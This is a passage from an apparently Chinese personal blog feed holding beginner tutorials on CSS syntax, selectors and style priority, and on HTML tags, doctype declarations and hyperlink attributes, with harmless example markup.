      <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
      
        <content type="html"><![CDATA[<h1 id="深度学习网页前端之CSS"><a href="#深度学习网页前端之CSS" class="headerlink" title="深度学习网页前端之CSS"></a>深度学习网页前端之CSS</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你如果问我CSS是什么<del>CSS就是CSS啊</del></p><p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p><p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p><h2 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h2><p>CSS由两个主要的部分构成:</p><ul><li>选择器 &#x2F;&#x2F;需要改变样式的HTML元素</li><li>一条或多条说明 &#x2F;&#x2F;每给说明&#x3D;1个属性+1个值</li></ul><p>每个属性有一个值。属性和值被冒号分开</p><p>一般都放在head部分的style里</p><p>大概长这个样子</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p><p>css的注释使用经典的&#x2F;* *&#x2F;</p><h2 id="对于多模块的处理"><a href="#对于多模块的处理" class="headerlink" title="对于多模块的处理"></a>对于多模块的处理</h2><p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p><h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><p>在{}前加上<code>#[选择器名字]</code></p><p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p><p>这样就大功告成了</p><blockquote><p>[!IMPORTANT]</p><p>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用</p></blockquote><h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p><p>head部分:.</p><pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;属性与值&#125;</code></pre><p>body部分: </p><pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;&lt;/<span class="selector-tag">div</span>&gt;</code></pre><h2 id="CSS的插入"><a href="#CSS的插入" class="headerlink" title="CSS的插入"></a>CSS的插入</h2><p>CSS的插入方式有三种</p><ul><li>外部样式表</li><li>内部样式表</li><li>内联样式</li></ul><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>就和图片差不多，从服务器的目录下引入样式表</p><pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre><pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>hr &#123;<span class="attribute">color</span>:sienna;&#125;<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre><p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p><blockquote><p>用作外部表的CSS文件不能包含任何的 html 标签</p></blockquote><p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>单个文档需要特殊样式时，就使用内部样式表：</p><pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span><span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span><span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span><span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p><p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p><pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre><h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p><p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p><pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre><p>而内部样式表拥有针对 h3 选择器的两个属性：</p><pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre><p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p><pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre><p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p><hr><p>样式的优先级为:</p><p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p><blockquote><p><strong>注意：</strong>如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p></blockquote><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul><li>页面: body{background-color: }</li><li>正文: p{background-color:}</li><li>标题: h1{background-color: }</li><li>指定模块: div{background-color:}</li></ul><h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>描述了元素的背景图像</p><ul><li>实例</li></ul><pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -Web前端 -CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习以及网页搭建初实践</title>
      <link href="/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/"/>
      <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML学习以及网页搭建初实践"><a href="#HTML学习以及网页搭建初实践" class="headerlink" title="HTML学习以及网页搭建初实践"></a>HTML学习以及网页搭建初实践</h1><p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p><h2 id="HTML实例的基本结构"><a href="#HTML实例的基本结构" class="headerlink" title="HTML实例的基本结构"></a>HTML实例的基本结构</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03"></p><ul><li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li><li><strong><html></html></strong> 元素是 HTML 页面的根元素</li><li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li><li><strong><title></title></strong> 元素描述了文档的标题</li><li><strong><body></body></strong> 元素包含了可见的页面内容</li><li><strong><h1></h1></strong> 元素定义一个大标题</li><li><strong><p></p></strong> 元素定义一个段落</li></ul><p>其实F12查一下源代码就能知道是大致怎么样个结构</p><h2 id="什么是-HTML"><a href="#什么是-HTML" class="headerlink" title="什么是 HTML?"></a>什么是 HTML?</h2><p>HTML 是用来描述网页的一种语言。</p><ul><li>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</li><li>HTML 不是一种编程语言，而是一种<strong>标记</strong>语言</li><li>标记语言是一套<strong>标记标签</strong> (markup tag)</li><li>HTML 使用标记标签来<strong>描述</strong>网页</li><li>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</li><li>HTML文档也叫做 <strong>web 页面</strong></li></ul><h2 id="HTML-标签"><a href="#HTML-标签" class="headerlink" title="HTML 标签"></a>HTML 标签</h2><p>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</p><ul><li>HTML 标签是由<em>尖括号</em>包围的关键词，比如 <html></html></li><li>HTML 标签通常是<em>成对出现</em>的，比如 <b> 和 </b></li><li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li><li>开始和结束标签也被称为<em>开放标签</em>和<em>闭合标签</em></li></ul><p>&lt;标签&gt;内容&lt;&#x2F;标签&gt;</p><hr><h2 id="HTML-元素"><a href="#HTML-元素" class="headerlink" title="HTML 元素"></a>HTML 元素</h2><p>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</p><p>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</p><p>HTML 元素:</p><pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre><h3 id><a href="#" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>内容划分元素，通过div与class的搭配轻松将页面划分为多个不同模块</p><h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>锚元素，通过其的herf属性来引用其他网页&#x2F;本地的文件</p><ul><li><p>实例</p><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.mozilla.com&quot;&gt; Mozilla &lt;/a&gt; //绝对地址引用&lt;a href=&quot;//example.com&quot;&gt;相对于协议的 URL&lt;/a&gt;&lt;a href=&quot;/zh-CN/docs/Web/HTML&quot;&gt;相对于源的 URL&lt;/a&gt;&lt;a href=&quot;./p&quot;&gt;相对于路径的 URL&lt;/a&gt;//相对地址的链接&lt;!-- &lt;a&gt; 元素链接到下面部分 --&gt;&lt;p&gt;&lt;a href=&quot;#Section_further_down&quot;&gt; 跳转到下方标题 &lt;/a&gt;&lt;/p&gt;&lt;!-- 要链接到的标题 --&gt;&lt;h2 id=&quot;Section_further_down&quot;&gt;更下面的部分&lt;/h2&gt;//同页面链接</code></pre><p>当然，你也可以将<code>&lt;a&gt;</code>插入在段落中达到引用的效果</p><h3 id="待补全中。。。"><a href="#待补全中。。。" class="headerlink" title="(待补全中。。。)"></a>(待补全中。。。)</h3></li></ul><h2 id="网页结构"><a href="#网页结构" class="headerlink" title="网页结构"></a>网页结构</h2><p>一般分为head和body</p><pre><code class="highlight html"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>小标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>        <span class="tag">&lt;<span class="name">p</span>&gt;</span>正文<span class="tag">&lt;/<span class="name">p</span>&gt;</span>    <span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre><p>只有body部分会在网页中显示</p><h2 id="HTML版本"><a href="#HTML版本" class="headerlink" title="HTML版本"></a>HTML版本</h2><p>从初期的网络诞生后，已经出现了许多HTML版本:</p><table><thead><tr><th align="left">版本</th><th align="left">发布时间</th></tr></thead><tbody><tr><td align="left">HTML</td><td align="left">1991</td></tr><tr><td align="left">HTML+</td><td align="left">1993</td></tr><tr><td align="left">HTML 2.0</td><td align="left">1995</td></tr><tr><td align="left">HTML 3.2</td><td align="left">1997</td></tr><tr><td align="left">HTML 4.01</td><td align="left">1999</td></tr><tr><td align="left">XHTML 1.0</td><td align="left">2000</td></tr><tr><td align="left">HTML5</td><td align="left">2012</td></tr><tr><td align="left">XHTML5</td><td align="left">2013</td></tr></tbody></table><hr><h2 id="声明"><a href="#声明" class="headerlink" title="&lt;!DOCTYPE&gt; 声明"></a>&lt;!DOCTYPE&gt; 声明</h2><!DOCTYPE><p>声明有助于浏览器中正确显示网页。</p><p>网络上有很多不同的文件，如果能够正确声明HTML的版本，浏览器就能正确显示网页内容。</p><p>doctype 声明是不区分大小写的，以下方式均可：</p><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span><span class="meta">&lt;!Doctype <span class="keyword">Html</span>&gt;</span></code></pre><hr><h2 id="通用声明"><a href="#通用声明" class="headerlink" title="通用声明"></a>通用声明</h2><h3 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></code></pre><h3 id="HTML-4-01"><a href="#HTML-4-01" class="headerlink" title="HTML 4.01"></a>HTML 4.01</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span></span><span class="meta"><span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></code></pre><h3 id="XHTML-1-0"><a href="#XHTML-1-0" class="headerlink" title="XHTML 1.0"></a>XHTML 1.0</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span><span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></code></pre><p>查看完整网页声明类型 <a href="https://www.runoob.com/tags/tag-doctype.html">DOCTYPE 参考手册</a>。</p><hr><h2 id="中文编码"><a href="#中文编码" class="headerlink" title="中文编码"></a>中文编码</h2><p>目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK。</p><h2 id="HTML-实例"><a href="#HTML-实例" class="headerlink" title="HTML 实例"></a>HTML 实例</h2><p>自己尝试了一下，大概这个效果。?</p><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>哼哼哼，你也要来下北泽和我一辈子红茶吗<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span> 什么，你的意思是说愿意和我一起看一个一个林擒吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>哼哼哼，啊啊啊啊啊啊啊啊啊(指发自内心的高兴嚎叫<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316090224855.png" alt="image-20250316090224855"></p><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> <span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">title</span>&gt;</span> 页面标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span>&gt;</span>  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre><h2 id="更加完善的结构"><a href="#更加完善的结构" class="headerlink" title="更加完善的结构"></a>更加完善的结构</h2><p><em>*<em><strong>开始标签(无&#x2F;)常被称为</strong>起始标签（opening tag）</em>*，结束标签(有&#x2F;)常称为</em><em>闭合标签（closing tag）</em>*</p><h3 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a><strong>HTML 标题</strong></h3><p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的。从1-6标题的大小逐步减小(和markdown的几级标题应该是一个道理)</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;6&quot;</span>&gt;</span>这是6号字体文本<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="comment">&lt;!--size和h1,h2这些一一对应--&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></code></pre><p>请确保将 HTML 标题 标签只用于标题。不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题。</p><p>搜索引擎使用标题为您的网页的结构和内容编制索引。</p><p>因为用户可以通过标题来快速浏览您的网页，所以用标题来呈现文档结构是很重要的。</p><p>应该将 h1 用作主标题（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p><hr><h3 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a><strong>HTML 段落</strong></h3><p>HTML 段落是通过标签 <code>&lt;p&gt;</code> 来定义的。</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是另外一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre><hr><h3 id="HTML-链接"><a href="#HTML-链接" class="headerlink" title="HTML 链接"></a><strong>HTML 链接</strong></h3><p>HTML 链接是通过标签<code> &lt;a&gt;</code> 来定义的。</p><p>HTML 链接（Anchor）是网页之间跳转的核心部分。</p><p>HTML 使用链接与网络上的另一个文档相连。</p><p>HTML中的链接是一种用于在不同网页之间导航的元素。</p><p>链接通常用于将一个网页与另一个网页或资源（如文档、图像、音频文件等）相关联。</p><p>链接允许用户在浏览网页时单击文本或图像来跳转到其他位置，从而实现网页之间的互联。</p><p>HTML 链接 通过标签创建，通常用于将用户从一个页面导航到另一个页面、从一个部分跳转到页面中的另一个部分、下载文件、打开电子邮件应用程序或执行 JavaScript 函数等。</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre><p>**提示:**在 href 属性中指定链接的地址。</p><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;URL&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre><ul><li><code>&lt;a&gt;</code> 标签：定义了一个超链接（anchor）。它是 HTML 中用来创建可点击链接的主要标签。</li><li><code>href</code> 属性：指定目标 URL，当点击链接时，浏览器将导航到此 URL。</li></ul><p>以下实例演示来如何在 HTML 文档中创建链接：</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向本网站中的一个页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.microsoft.com/&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向万维网上的页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre><hr><h4 id="HTML-超链接（链接）"><a href="#HTML-超链接（链接）" class="headerlink" title="HTML 超链接（链接）"></a>HTML 超链接（链接）</h4><p>HTML使用标签 <code>&lt;a&gt;</code> 来设置超文本链接。</p><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</p><p>当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</p><p>在标签 <code>&lt;a&gt;</code> 中使用了<code> href</code> 属性来描述链接的地址。</p><p>默认情况下，链接将以以下形式出现在浏览器中：</p><ul><li>一个未访问过的链接显示为蓝色字体并带有下划线。</li><li>访问过的链接显示为紫色并带有下划线。</li><li>点击链接时，链接显示为红色并带有下划线。</li></ul><blockquote><p>注意：如果为这些超链接设置了 CSS 样式，展示样式会根据 CSS 的设定而显示。</p></blockquote><hr><h4 id="HTML-链接属性"><a href="#HTML-链接属性" class="headerlink" title="HTML 链接属性"></a>HTML 链接属性</h4><p><code>href </code>属性描述了链接的目标。</p><h5 id="href：定义链接目标。"><a href="#href：定义链接目标。" class="headerlink" title="href：定义链接目标。"></a>href：定义链接目标。</h5><p>这是超链接最重要的属性，用来指定链接的目的地，可以是另一个网页、文件、邮件、电话号码或 JavaScript。</p><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>访问 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre><h5 id="target：定义链接的打开方式。"><a href="#target：定义链接的打开方式。" class="headerlink" title="target：定义链接的打开方式。"></a>target：定义链接的打开方式。</h5><ul><li><code>_blank</code>: 在新窗口或新标签页中打开链接。</li><li><code>_self</code>: 在当前窗口或标签页中打开链接（默认）。</li><li><code>_parent</code>: 在父框架中打开链接。&#x2F;&#x2F;后续会了解到</li><li><code>_top</code>: 在整个窗口中打开链接，取消任何框架。&#x2F;&#x2F;后续会了解到</li></ul><ul><li>实例</li></ul><pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>新窗口打开 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre><h5 id="rel：定义链接与目标页面的关系。"><a href="#rel：定义链接与目标页面的关系。" class="headerlink" title="rel：定义链接与目标页面的关系。"></a>rel：定义链接与目标页面的关系。</h5><p><strong><code>nofollow</code></strong>: 表示搜索引擎不应跟踪该链接，常用于外部链接。</p><p><strong><code>noopener</code></strong> 和 <strong><code>noreferrer</code></strong>: 防止在新标签中打开链接时的安全问题，尤其是使用 <strong>target&#x3D;”_blank”</strong> 时。</p><ul><li><code>noopener</code>: 防止新的浏览上下文（页面）访问<code>window.opener</code>属性和<code>open</code>方法。</li><li><code>noreferrer</code>: 不发送referer header（即不告诉目标网站你从哪里来的）。</li><li><code>noopener noreferrer</code>: 同时使用<code>noopener</code>和<code>noreferrer</code>。例子: <code>&lt;a href=&quot;https://www.example.com&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></li></ul><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;安全链接&lt;/a&gt;</code></pre><h5 id="download：提示浏览器下载链接目标而不是导航到该目标。"><a href="#download：提示浏览器下载链接目标而不是导航到该目标。" class="headerlink" title="download：提示浏览器下载链接目标而不是导航到该目标。"></a>download：提示浏览器下载链接目标而不是导航到该目标。</h5><p>如果指定了文件名，浏览器会提示下载并保存为指定文件名。</p><p>例如：</p><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;file.pdf&quot; download=&quot;example.pdf&quot;&gt;下载文件&lt;/a&gt;</code></pre><h5 id="title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。"><a href="#title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。" class="headerlink" title="title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。"></a>title：定义链接的额外信息，当鼠标悬停在链接上时显示的工具提示。</h5><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; title=&quot;访问 Example 网站&quot;&gt;访问 Example&lt;/a&gt;</code></pre><h5 id="id：用于链接锚点，通常在同一页面中跳转到某个特定位置。"><a href="#id：用于链接锚点，通常在同一页面中跳转到某个特定位置。" class="headerlink" title="id：用于链接锚点，通常在同一页面中跳转到某个特定位置。"></a>id：用于链接锚点，通常在同一页面中跳转到某个特定位置。</h5><ul><li>实例</li></ul><p><em><!-- 链接到页面中的某个部分 --></em><br>&lt;**a** href&#x3D;”#section1”&gt;跳转到第1部分&lt;&#x2F;**a**&gt;<br>&lt;**div** id&#x3D;”section1”&gt;这是第1部分&lt;&#x2F;**div**&gt;</p><h5 id="hreflang-指定链接的目标URL的语言"><a href="#hreflang-指定链接的目标URL的语言" class="headerlink" title="hreflang: 指定链接的目标URL的语言"></a>hreflang: 指定链接的目标URL的语言</h5><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com/es&quot; hreflang=&quot;es&quot;&gt;访问西班牙语网站&lt;/a&gt;</code></pre><h5 id="type-指定链接资源的MIME类型"><a href="#type-指定链接资源的MIME类型" class="headerlink" title="type: 指定链接资源的MIME类型"></a>type: 指定链接资源的MIME类型</h5><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;样式表&lt;/a&gt;</code></pre><h5 id="class-用于指定元素的类名（CSS中定义）"><a href="#class-用于指定元素的类名（CSS中定义）" class="headerlink" title="class: 用于指定元素的类名（CSS中定义）"></a>class: 用于指定元素的类名（CSS中定义）</h5><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; class=&quot;external-link&quot;&gt;外部链接&lt;/a&gt;</code></pre><h5 id="style-直接在元素上定义CSS样式"><a href="#style-直接在元素上定义CSS样式" class="headerlink" title="style: 直接在元素上定义CSS样式"></a>style: 直接在元素上定义CSS样式</h5><ul><li>实例</li></ul><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; style=&quot;color: red;&quot;&gt;红色链接&lt;/a&gt;</code></pre><hr><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h4><pre><code class="highlight plaintext">&lt;a href=&quot;https://www.runoob.com/&quot;&gt;访问菜鸟教程&lt;/a&gt;</code></pre><p>上面这行代码显示为：<a href="https://www.runoob.com/">访问菜鸟教程</a></p><p>点击这个超链接会把用户带到菜鸟教程的首页。</p><p><strong>提示:</strong> <em>“链接文本”</em> 不必一定是文本。图片或其他 HTML 